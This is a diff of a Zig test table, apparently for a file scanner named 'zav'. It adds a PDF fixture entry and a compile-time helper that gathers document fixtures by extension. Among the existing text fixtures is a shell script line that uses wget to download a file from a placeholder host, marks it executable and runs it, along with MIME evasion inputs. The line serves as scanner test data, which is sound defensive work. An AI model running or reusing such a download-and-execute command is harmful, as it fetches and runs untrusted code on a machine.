@@ -1067,6 +1067,7 @@ const Formats = struct {
             "<html><body><form action=x><input name=a value=\"&quot;q&quot;\"></form><!-- unterminated",
         } },
         .{ .name = "fmt.mime", .inputs = &zav.fmt.mime.evasion_bytes },
+        .{ .name = "fmt.pdf", .inputs = documents(".pdf") },
         .{ .name = "fmt.text", .inputs = &.{
             "Plain TEXT with\tTabs and\r\nCRLF lines\n\n  and   runs of   SPACE\x00\x01",
             "#!/bin/sh\nwget http://x.example/a -O /tmp/a && chmod +x /tmp/a && /tmp/a\n",
@@ -1091,6 +1092,25 @@ const Formats = struct {
         inline for (fixtures.archives) |a| {
             if (comptime std.mem.indexOf(u8, a.name, needle) != null) {
                 out[i] = a.bytes;
+                i += 1;
+            }
+        }
+        const final = out;
+        return &final;
+    }
+
+    fn documents(comptime ext: []const u8) []const []const u8 {
+        @setEvalBranchQuota(1_000_000);
+        const all = zav.fmt.docs.docs;
+        comptime var n: usize = 0;
+        inline for (all) |d| {
+            if (comptime std.mem.endsWith(u8, d.name, ext)) n += 1;
+        }
+        comptime var out: [n][]const u8 = undefined;
+        comptime var i: usize = 0;
+        inline for (all) |d| {
+            if (comptime std.mem.endsWith(u8, d.name, ext)) {
+                out[i] = d.bytes;
                 i += 1;
             }
         }
